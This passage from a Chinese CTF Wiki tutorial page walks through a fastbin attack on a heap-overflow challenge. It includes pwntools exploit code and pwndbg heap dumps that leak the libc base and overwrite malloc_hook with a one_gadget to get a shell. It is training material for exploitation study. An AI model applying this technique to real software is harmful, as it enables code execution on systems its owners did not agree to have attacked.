<span class=w>  </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=p>(</span><span class=kt>signed</span><span class=w> </span><span class=kt>int</span><span class=p>)</span><span class=n>result</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=mi>0</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=p>(</span><span class=kt>signed</span><span class=w> </span><span class=kt>int</span><span class=p>)</span><span class=n>result</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=mi>15</span><span class=w> </span><span class=p>)</span>
<span class=w>  </span><span class=p>{</span>
<span class=w>    </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>LODWORD</span><span class=p>(</span><span class=n>a1</span><span class=p>[(</span><span class=kt>signed</span><span class=w> </span><span class=kt>int</span><span class=p>)</span><span class=n>result</span><span class=p>].</span><span class=n>inuse</span><span class=p>);</span>
<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=p>(</span><span class=n>_DWORD</span><span class=p>)</span><span class=n>result</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=p>)</span>
<span class=w>    </span><span class=p>{</span>
<span class=w>      </span><span class=n>LODWORD</span><span class=p>(</span><span class=n>a1</span><span class=p>[</span><span class=n>v2</span><span class=p>].</span><span class=n>inuse</span><span class=p>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
<span class=w>      </span><span class=n>a1</span><span class=p>[</span><span class=n>v2</span><span class=p>].</span><span class=n>size</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mf>0L</span><span class=n>L</span><span class=p>;</span>
<span class=w>      </span><span class=n>free</span><span class=p>(</span><span class=n>a1</span><span class=p>[</span><span class=n>v2</span><span class=p>].</span><span class=n>ptr</span><span class=p>);</span>
<span class=w>      </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kr>__int64</span><span class=p>)</span><span class=o>&amp;</span><span class=n>a1</span><span class=p>[</span><span class=n>v2</span><span class=p>];</span>
<span class=w>      </span><span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span><span class=w> </span><span class=o>*</span><span class=p>)(</span><span class=n>result</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>16</span><span class=p>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mf>0L</span><span class=n>L</span><span class=p>;</span>
<span class=w>    </span><span class=p>}</span>
<span class=w>  </span><span class=p>}</span>
<span class=w>  </span><span class=k>return</span><span class=w> </span><span class=n>result</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></div> <p>dump 就是輸出對應索引 chunk 的內容。</p> <h3 id=_27>利用思路<a class=headerlink href=#_27 title="Permanent link">&para;</a></h3> <p>可以確定的是，我們主要有的漏洞就是任意長度堆溢出。由於該程序幾乎所有保護都開啓了，所以我們必須要有一些泄漏纔可以控制程序的流程。基本利用思路如下</p> <ul> <li>利用 unsorted bin 地址泄漏 libc 基地址。</li> <li>利用 fastbin attack 將chunk 分配到 malloc_hook 附近。</li> </ul> <h4 id=libc_1>泄漏 libc 基地址<a class=headerlink href=#libc_1 title="Permanent link">&para;</a></h4> <p>由於我們是希望使用 unsorted bin 來泄漏 libc 基地址，所以必須要有 chunk 可以被鏈接到 unsorted bin 中，所以該 chunk 不能使 fastbin chunk，也不能和 top chunk 相鄰。因爲前者會被添加到 fastbin 中，後者在不是fastbin 的情況下，會被合併到 top chunk 中。因此，我們這裏構造一個 small bin chunk。在將該 chunk 釋放到 unsorted bin 的同時，也需要讓另外一個正在使用的 chunk 可以同時指向該 chunk 的位置。這樣纔可以進行泄漏。具體設計如下</p> <div class=highlight><pre><span></span><code>    <span class=c1># 1. leak libc base</span>
    <span class=n>allocate</span><span class=p>(</span><span class=mh>0x10</span><span class=p>)</span>  <span class=c1># idx 0, 0x00</span>
    <span class=n>allocate</span><span class=p>(</span><span class=mh>0x10</span><span class=p>)</span>  <span class=c1># idx 1, 0x20</span>
    <span class=n>allocate</span><span class=p>(</span><span class=mh>0x10</span><span class=p>)</span>  <span class=c1># idx 2, 0x40</span>
    <span class=n>allocate</span><span class=p>(</span><span class=mh>0x10</span><span class=p>)</span>  <span class=c1># idx 3, 0x60</span>
    <span class=n>allocate</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span>  <span class=c1># idx 4, 0x80</span>
    <span class=c1># free idx 1, 2, fastbin[0]-&gt;idx1-&gt;idx2-&gt;NULL</span>
    <span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
    <span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</code></pre></div> <p>首先，我們申請了 5 個chunk，並釋放了兩個chunk，此時堆的情況如下。</p> <div class=highlight><pre><span></span><code>pwndbg&gt;<span class=w> </span>x/20gx<span class=w> </span>0x55a03ca22000
0x55a03ca22000:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000021<span class=w> </span>idx<span class=w> </span><span class=m>0</span>
0x55a03ca22010:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000000
0x55a03ca22020:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000021<span class=w> </span>idx<span class=w> </span><span class=m>1</span>
0x55a03ca22030:<span class=w> </span>0x000055a03ca22040<span class=w>  </span>0x0000000000000000
0x55a03ca22040:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000021<span class=w> </span>idx<span class=w> </span><span class=m>2</span>
0x55a03ca22050:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000000
0x55a03ca22060:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000021<span class=w> </span>idx<span class=w> </span><span class=m>3</span>
0x55a03ca22070:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000000
0x55a03ca22080:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000091<span class=w> </span>idx<span class=w> </span><span class=m>4</span>
0x55a03ca22090:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000000
pwndbg&gt;<span class=w> </span>fastbins
fastbins
0x20:<span class=w> </span>0x55a03ca22020<span class=w> </span>—▸<span class=w> </span>0x55a03ca22040<span class=w> </span>◂—<span class=w> </span>0x0
0x30:<span class=w> </span>0x0
0x40:<span class=w> </span>0x0
0x50:<span class=w> </span>0x0
0x60:<span class=w> </span>0x0
0x70:<span class=w> </span>0x0
0x80:<span class=w> </span>0x0
</code></pre></div> <p>當我們編輯 idx0 後，確實已經將其指向idx4了。這裏之所以可以成功是因爲堆的始終是 4KB 對齊的，所以idx 4的起始地址的第一個字節必然是0x80。</p> <div class=highlight><pre><span></span><code>    <span class=c1># edit idx 0 chunk to particial overwrite idx1&#39;s fd to point to idx4</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=mh>0x10</span> <span class=o>*</span> <span class=s1>&#39;a&#39;</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x21</span><span class=p>)</span> <span class=o>+</span> <span class=n>p8</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span>
    <span class=n>fill</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>),</span> <span class=n>payload</span><span class=p>)</span>
</code></pre></div> <p>修改成功後如下</p> <div class=highlight><pre><span></span><code>pwndbg&gt;<span class=w> </span>x/20gx<span class=w> </span>0x55a03ca22000
0x55a03ca22000:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000021
0x55a03ca22010:<span class=w> </span>0x6161616161616161<span class=w>  </span>0x6161616161616161
0x55a03ca22020:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000021
0x55a03ca22030:<span class=w> </span>0x000055a03ca22080<span class=w>  </span>0x0000000000000000
0x55a03ca22040:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000021
0x55a03ca22050:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000000
0x55a03ca22060:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000021
0x55a03ca22070:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000000
0x55a03ca22080:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000091
0x55a03ca22090:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000000
pwndbg&gt;<span class=w> </span>fastbins
fastbins
0x20:<span class=w> </span>0x55a03ca22020<span class=w> </span>—▸<span class=w> </span>0x55a03ca22080<span class=w> </span>◂—<span class=w> </span>0x0
0x30:<span class=w> </span>0x0
0x40:<span class=w> </span>0x0
0x50:<span class=w> </span>0x0
0x60:<span class=w> </span>0x0
0x70:<span class=w> </span>0x0
0x80:<span class=w> </span>0x0
</code></pre></div> <p>那麼，當我們再次申請兩個時，第二個申請到的就是idx 4處的chunk。爲了能夠申請成功，我們需要確保 idx4 的size 與當前 fastbin 的大小一致，所以，我們得修改它的大小。申請成功後，idx2會指向idx4。</p> <div class=highlight><pre><span></span><code>    <span class=c1># if we want to allocate at idx4, we must set it&#39;s size as 0x21</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=mh>0x10</span> <span class=o>*</span> <span class=s1>&#39;a&#39;</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x21</span><span class=p>)</span>
    <span class=n>fill</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>),</span> <span class=n>payload</span><span class=p>)</span>
    <span class=n>allocate</span><span class=p>(</span><span class=mh>0x10</span><span class=p>)</span>  <span class=c1># idx 1</span>
    <span class=n>allocate</span><span class=p>(</span><span class=mh>0x10</span><span class=p>)</span>  <span class=c1># idx 2, which point to idx4&#39;s location</span>
</code></pre></div> <p>之後，如果我們想要將 idx 4 放到 unsorted bin 中的話，爲了防止其與top chunk 合併，我們需要再次申請一個chunk。此後再釋放 idx4 就會進入 unsorted bin中去了。此時由於 idx2 也指向這個地址，所以我們直接展示他的內容就可以得到unsorted bin的地址了。</p> <div class=highlight><pre><span></span><code>    <span class=c1># if want to free idx4 to unsorted bin, we must fix its size</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=mh>0x10</span> <span class=o>*</span> <span class=s1>&#39;a&#39;</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x91</span><span class=p>)</span>
    <span class=n>fill</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>),</span> <span class=n>payload</span><span class=p>)</span>
    <span class=c1># allocate a chunk in order when free idx4, idx 4 not consolidate with top chunk</span>
    <span class=n>allocate</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span>  <span class=c1># idx 5</span>
    <span class=n>free</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
    <span class=c1># as idx 2 point to idx4, just show this</span>
    <span class=n>dump</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Content: </span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=n>unsortedbin_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span>
    <span class=n>main_arena</span> <span class=o>=</span> <span class=n>unsortedbin_addr</span> <span class=o>-</span> <span class=n>offset_unsortedbin_main_arena</span>
    <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;main arena addr: &#39;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>main_arena</span><span class=p>))</span>
    <span class=n>main_arena_offset</span> <span class=o>=</span> <span class=mh>0x3c4b20</span>
    <span class=n>libc_base</span> <span class=o>=</span> <span class=n>main_arena</span> <span class=o>-</span> <span class=n>main_arena_offset</span>
    <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;libc base addr: &#39;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc_base</span><span class=p>))</span>
</code></pre></div> <h4 id=chunkmalloc_hook>分配chunk到malloc_hook附近<a class=headerlink href=#chunkmalloc_hook title="Permanent link">&para;</a></h4> <p>由於 malloc hook 附近的 chunk 大小爲 0x7f，所以數據區域爲0x60。這裏我們再次申請的時候，對應 fastbin 鏈表中沒有相應大小chunk，所以根據堆分配器規則，它會依次處理unsorted bin中的chunk，將其放入到對應的bin中，之後會再次嘗試分配 chunk，因爲之前釋放的 chunk 比當前申請的 chunk 大，所以可以從其前面分割出來一塊。所以 idx2 仍然指向該位置，那麼我們可以使用類似的辦法先釋放申請到的chunk，然後再次修改 fd 指針爲 fake chunk 即可。此後我們修改 malloc_hook 處的指針即可得到觸發 onegadget。</p> <p><div class=highlight><pre><span></span><code><span class=c1># 2. malloc to malloc_hook nearby</span>
<span class=c1># allocate a 0x70 size chunk same with malloc hook nearby chunk, idx4</span>
<span class=n>allocate</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span>
<span class=n>free</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
<span class=c1># edit idx4&#39;s fd point to fake chunk</span>
<span class=n>fake_chunk_addr</span> <span class=o>=</span> <span class=n>main_arena</span> <span class=o>-</span> <span class=mh>0x33</span>
<span class=n>fake_chunk</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_chunk_addr</span><span class=p>)</span>
<span class=n>fill</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>fake_chunk</span><span class=p>),</span> <span class=n>fake_chunk</span><span class=p>)</span>

<span class=n>allocate</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span>  <span class=c1># idx 4</span>
<span class=n>allocate</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span>  <span class=c1># idx 6</span>

<span class=n>one_gadget_addr</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x4526a</span>
<span class=n>payload</span> <span class=o>=</span> <span class=mh>0x13</span> <span class=o>*</span> <span class=s1>&#39;a&#39;</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>one_gadget_addr</span><span class=p>)</span>
<span class=n>fill</span><span class=p>(</span><span class=mi>6</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>),</span> <span class=n>payload</span><span class=p>)</span>
<span class=c1># trigger malloc_hook</span>
<span class=n>allocate</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span>
<span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> 同時，這裏的 onegadget 地址也可能需要嘗試多次。</p> <h2 id=_28>題目<a class=headerlink href=#_28 title="Permanent link">&para;</a></h2> <ul> <li>L-CTF2016–pwn200</li> </ul> <h2 id=_29>參考文獻<a class=headerlink href=#_29 title="Permanent link">&para;</a></h2> <ul> <li><a href=https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/ >https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/</a></li> <li><a href=http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html>http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html</a></li> <li><a href=https://www.slideshare.net/YOKARO-MON/oreo-hacklu-ctf-2014-65771717>https://www.slideshare.net/YOKARO-MON/oreo-hacklu-ctf-2014-65771717</a></li> </ul> </article> </div> </div> </main> <footer class=md-footer> <nav class="md-footer__inner md-grid" aria-label=Footer> <a href=../use-after-free/ class="md-footer__link md-footer__link--prev" rel=prev> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </div> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> 上一页 </span> Use After Free </div> </div> </a> <a href=../unsorted-bin-attack/ class="md-footer__link md-footer__link--next" rel=next> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> 下一页 </span> Unsorted Bin Attack </div> </div> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-footer-copyright> <div class=md-footer-copyright__highlight> Copyright &copy; 2016 - 2023 CTF Wiki Team </div> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs Insiders </a> </div> </div> </div> </footer> </div> <script src=../../../../../../assets/javascripts/vendor.191088e8.min.js></script> <script src=../../../../../../assets/javascripts/bundle.d4cf0930.min.js></script><script id=__lang type=application/json>{"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "Missing"}</script> <script>
        app = initialize({
          base: "../../../../../..",
          features: ["navigation.tabs", "navigation.tabs.sticky", "search.suggest", "search.highlight", "search.share"],
          search: Object.assign({
            worker: "../../../../../../assets/javascripts/worker/search.e77c40e2.min.js"
          }, typeof search !== "undefined" && search),
          version: {}
        })
      </script> <script src=https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js></script> <script src=https://ctf-wiki.org/static/js/extra.js></script> <script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script> </body> </html>